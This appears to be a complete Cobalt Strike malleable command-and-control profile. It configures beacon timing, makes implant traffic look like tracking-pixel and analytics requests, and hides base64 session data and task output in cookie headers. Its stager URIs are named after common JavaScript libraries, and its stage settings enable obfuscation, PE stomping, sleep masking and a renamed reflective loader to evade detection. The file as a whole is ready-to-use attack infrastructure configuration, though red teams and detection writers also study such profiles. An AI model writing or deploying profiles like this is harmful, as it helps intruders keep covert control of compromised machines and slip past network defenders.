set sample_name "zangge";

set sleeptime "3000";
set jitter    "20";
set maxdns    "255";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36";

https-certificate {
    set CN       "Jhon";
    set O        "Chrome";   
    set C        "Earth";
    set L        "Somewhere";
    set OU       "Advanced";  
    set ST       "Cyberspace";
    set validity "365";
}

code-signer{
    set keystore "cobaltstrike.store";
    set password "123456";
    set alias "baidu.com";
}
set dns_idle "8.8.4.4";

set dns_sleep "0";

set maxdns    "235";
http-get {

    set uri "/ca /dpixel /__utm.gif /pixel.gif /g.pixel /dot.gif /updates.rss /fwlink /cm /cx /pixel /match /visit.js /load /push /ptj /j.ad /ga.js /en_US/all.js /activity /IE9CompatViewList.xml";
    client {
        header "Accept" "*/*";
        header "Accept-Language" "en-us";
        header "Accept-Encoding" "text/plain";
        header "Content-Type" "application/x-www-form-urltrytryd";
        metadata {
            base64;
            prepend "SESSIONID=wqe454wqe2ds15ds4dsa5ds4";
            header "Cookie";
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Server" "Nodejs";
        output {
            base64;
            print;
        }
    }
}
http-stager {  
    set uri_x86 "/vue.min.js";
    set uri_x64 "/bootstrap-2.min.js";
}
stage{
        set checksum "0";
        set compile_time "25 Oct 2016 01:57:23";
        set stomppe "true";
        set obfuscate "true";
        set cleanup "true";
        set userwx "false";
        set sleep_mask "true";
        transform-x86 {
            strrep "ReflectiveLoader" "misakaloader";
    }
        transform-x64 {
            strrep "ReflectiveLoader" "misakaloader";
    }
}
http-post {
    set uri "/submit.php /Login.php /index.php /Auth.php /ServerAuth.php";
    client {
        header "Accept" "*/*";
        header "Accept-Language" "en-us";
        header "Accept-Encoding" "text/plain";
        header "Content-Type" "application/x-www-form-urltrytryd";
        id {
            base64;
            prepend "JSESSION=dsf5sd4f5e45fe4s65d4f856e4";
            header "Cookie";
        }
        output {
            base64;
            print;
        }
    }

    server {
        header "Content-Type" "application/ocsp-response";
        header "content-transfer-encoding" "binary";
        header "Connection" "keep-alive";
        output {
            base64;
            print;
        }
    }
}